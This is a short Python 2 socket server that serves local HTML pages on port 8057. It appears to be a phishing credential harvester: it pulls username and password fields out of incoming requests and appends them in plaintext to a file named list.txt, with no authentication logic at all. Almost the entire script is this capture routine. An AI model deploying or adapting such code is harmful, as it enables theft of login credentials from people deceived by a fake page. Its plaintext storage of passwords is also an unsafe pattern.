from socket import *
import re
s=socket(AF_INET,SOCK_STREAM)
host="localhost"
port=8057
s.bind((host,port))
s.listen(4)
while True:
	c,addr=s.accept()
	data=c.recv(1024)
	print data
	match1=re.search(r'GET\s/([\w]+).html',data)
	if match1:
		c.send(open(match1.group(1)+".html").read())
	match=re.search(r'username=([\w_.]+)&password=([\w.]+)',data)
	if match:
		f=open("list.txt","a")
		f.write("\nUsername:")
		f.write(match.group(1))
		f.write("\nPassword:")
		f.write(match.group(2))
		f.close()
